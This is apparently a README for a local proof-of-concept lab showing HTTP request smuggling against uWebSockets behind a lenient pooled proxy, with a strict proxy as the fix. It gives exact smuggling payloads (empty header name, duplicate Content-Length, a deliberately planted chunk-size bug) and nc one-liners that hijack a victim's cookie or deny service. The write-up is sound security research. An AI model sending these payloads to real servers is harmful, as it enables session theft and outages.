# Fully-networked HTTP request-smuggling PoC (real uWebSockets, real TCP)

This is an end-to-end, **all-over-real-TCP** proof of concept for the HTTP request-smuggling
class documented in [`../../FINDINGS.md`](../../FINDINGS.md). Unlike the in-process demo in
[`../`](../), here every hop is a real socket and both proxies are standalone processes with
their own listeners, so you can point `curl`/`nc`/Burp at them too.

Three attacker scenarios (A, B, C) each map to one of the HTTP-parsing deviations, plus a
mitigation run that shows a strict front-end closing all three.

---

## Topology

```
                                   ┌──────────────────────────────────────────┐
  attacker ──► :8080 vuln_proxy ───┤  ONE pooled TCP connection, reused        ├──► :9001
  victim   ──► :8080 vuln_proxy ───┤  across ALL clients, bytes forwarded      │    uWebSockets
                                   │  VERBATIM (lenient CDN/LB model)          │    (real server)
                                   └──────────────────────────────────────────┘

  attacker ──► :8081 strict_proxy ─►  Go net/http: validates + re-normalizes ──►  :9001
  victim   ──► :8081 strict_proxy ─►  every request; malformed => 400            uWebSockets
```

## Components

| File | Role |
|------|------|
| `backend_uws.cpp` | **Real uWebSockets** HTTP server on `:9001`. Catch-all route; logs and echoes the method / URL / `Cookie` / `X-Smuggled` header of **every request it parses**, so cross-user leakage is directly observable. |
| `vuln_proxy.go` | **Vulnerable** reverse proxy on `:8080`. Holds **one** back-end connection and reuses it for all clients; frames each request by its own (lenient) parse of `Content-Length` / chunked and forwards the bytes **verbatim**. Models a lenient CDN / load-balancer. |
| `strict_proxy.go` | **Mitigating** reverse proxy on `:8081` built on Go `net/http` + `httputil.ReverseProxy`. Parses/validates and re-normalizes every request; malformed ones are rejected with `400` before they reach the back-end. |
| `attacker.go` | Sends ONE crafted request for a chosen case (`a`/`b`/`c`). |
| `victim.go` | Sends ONE normal `GET /account` (with `Cookie: victim-secret-cookie`) moments later. |
| `run_networked.sh` | Builds everything and runs the scenarios. |

## Requirements

- `g++` with C++17, `go` (1.18+), and the `uSockets` submodule checked out
  (`git submodule update --init uSockets`). The default build is plain TCP (no SSL/zlib flags needed beyond `-lz`).

## Quick start

```bash
./run_networked.sh            # all three exploit cases + the mitigation
./run_networked.sh a          # only scenario A
./run_networked.sh b          # only scenario B
./run_networked.sh c          # only scenario C
./run_networked.sh mitigate   # only the strict-proxy mitigation
```

Each run starts a **fresh** back-end + proxy (a fresh pooled connection) so the scenarios are
independent and deterministic.

---

## Scenario A — empty header name hides `Content-Length`

**Deviation:** uWebSockets' `getHeader` uses an empty-key header as its end-of-list sentinel,
so a lone `:` line hides every following header — including `Content-Length` — from the app.
uWS then treats the request as **body-less**.

**Attacker's single request** (the 33-byte "body" is a smuggled request prefix — no `Host`, ends
mid-header so it will absorb the victim's bytes):

```
POST /benign HTTP/1.1\r\n
Host: t\r\n
:\r\n                       ← empty header name: hides the next line from uWS
Content-Length: 33\r\n      ← the proxy sees this; uWS does NOT
\r\n
GET /steal HTTP/1.1\r\nX-Smuggled:      ← 33 bytes; framed as "body" by the proxy
```

**What each party does**
1. `vuln_proxy` sees `Content-Length: 33`, reads headers + 33 body bytes, forwards all of it verbatim.
2. uWebSockets parses `POST /benign` with **no** Content-Length (hidden) → body length 0 → responds to `/benign`. The 33 leftover bytes are parsed as the **start of the next request** and buffered.
3. `victim` sends `GET /account` (Cookie) on the same pooled connection.
4. uWS appends it to the buffer, completing:
   ```
   GET /steal HTTP/1.1
   X-Smuggled: GET /account HTTP/1.1     ← victim's request-line captured
   Host: t
   Cookie: victim-secret-cookie          ← victim's session captured
   ```

**Expected result:** the victim is served the response for **`/steal`** carrying its own cookie.
`victim.go` prints `*** SMUGGLED ***`, and the back-end log shows
`req#2 method=get url=/steal cookie="victim-secret-cookie" x-smuggled="GET /account HTTP/1.1"`.

Run: `./run_networked.sh a`

---

## Scenario B — duplicate `Content-Length`

**Deviation:** uWebSockets accepts two `Content-Length` headers (only `Host` is de-duplicated) and
uses the **first**; the proxy here uses the **last** (a known lenient-proxy behavior). RFC 9112 says
such a message must be rejected.

**Attacker's single request:**

```
POST /benign HTTP/1.1\r\n
Host: t\r\n
Content-Length: 6\r\n         ← uWS uses this (first)
Content-Length: 39\r\n        ← the proxy uses this (last)
\r\n
HELLO!GET /steal HTTP/1.1\r\nX-Smuggled:       ← 39 bytes total
```

**What happens:** the proxy forwards all 39 body bytes; uWS reads only the first **6** (`HELLO!`)
as the `/benign` body and treats the remaining 33 (`GET /steal…`) as the next request, which then
absorbs the victim exactly as in Scenario A.

**Expected result:** identical to A — victim served `/steal` with its own cookie captured.

Run: `./run_networked.sh b`

---

## Scenario C — F1 chunked `g` = 16 (chunk-size disagreement)

**Deviation:** the planted `number > 16` (should be `> 15`) in `ChunkedEncoding.h:57` makes uWS
accept the non-hex bytes `g`/`G`/`@` as a chunk-size digit worth 16 (so `1g` = 32). A strict or
differently-lenient front-end computes a different chunk length.

**Attacker's single request** (chunked; `1g` is the poisoned size line):

```
POST /echo HTTP/1.1\r\n
Host: t\r\n
Transfer-Encoding: chunked\r\n
\r\n
1g\r\n                         ← uWS: size 0x1*16 + 16 = 32 ; strict parser: reject / 1
GET /steal HTTP/1.1\r\nX-Smuggled: \r\n
0\r\n\r\n
```

**What happens — and why C differs from A/B:** the `> 16` bug makes uWS *over-read* (it wants a
32-byte chunk), so instead of leaving trailing bytes to smuggle, uWS consumes past the proxy's
chunk terminator, mis-parses the remainder, returns **`505`** and closes the connection
(`Connection: close`). Because the proxy pools that one back-end connection, closing it
**poisons the pool** and the following victim request gets **no response**.

**Expected result:** the attacker gets `505`; the victim is **DENIED** (empty response).
`victim.go` prints `*** DENIED (DoS) ***`. This is a request-smuggling-class **denial of service**
via connection-pool poisoning — the honest outcome for F1, whose over-read makes it a weaker
primitive than the clean cross-user theft in A/B. (The `g`=16 parser deviation itself is proven
directly, and reproducibly, by [`../poc/verify_f1_chunked_smuggling.cpp`](../poc/verify_f1_chunked_smuggling.cpp).)

Run: `./run_networked.sh c`

---

## Mitigation

`./run_networked.sh mitigate` sends the same three attacks through the **strict** proxy (`:8081`):

```
attacker case a  ->  400 Bad Request        (empty header name rejected)
attacker case b  ->  400 Bad Request        (duplicate Content-Length rejected)
attacker case c  ->  502 / re-normalized    (chunk encoding rewritten; ambiguity removed)
victim (legit)   ->  200 OK, url=/account   (clean; NO /steal ever reaches the back-end)
```

The strict front-end validates and re-serializes every request, so no parser disagreement
survives to the back-end. Combined with a strict back-end parser (the proper fix for the planted
bugs) and/or not pooling back-end connections across users, the smuggle is fully closed.

## Manual poking

While a proxy is up you can also drive it by hand, e.g.:

```bash
printf 'POST /benign HTTP/1.1\r\nHost: t\r\n:\r\nContent-Length: 33\r\n\r\nGET /steal HTTP/1.1\r\nX-Smuggled: ' | nc 127.0.0.1 8080
printf 'GET /account HTTP/1.1\r\nHost: t\r\nCookie: victim-secret-cookie\r\n\r\n'                                   | nc 127.0.0.1 8080
```

## Faithfulness

The uWebSockets back-end is the **real, unmodified** library compiled from this repo's `src/`.
The `vuln_proxy` deliberately models a *lenient* front-end (verbatim byte-forwarding over a pooled
connection); that is a configuration/behavior choice, not a bug in Go — it's the class of front-end
under which any back-end parser deviation becomes exploitable. The `strict_proxy` shows that a
compliant front-end (Go `net/http`) closes the hole.
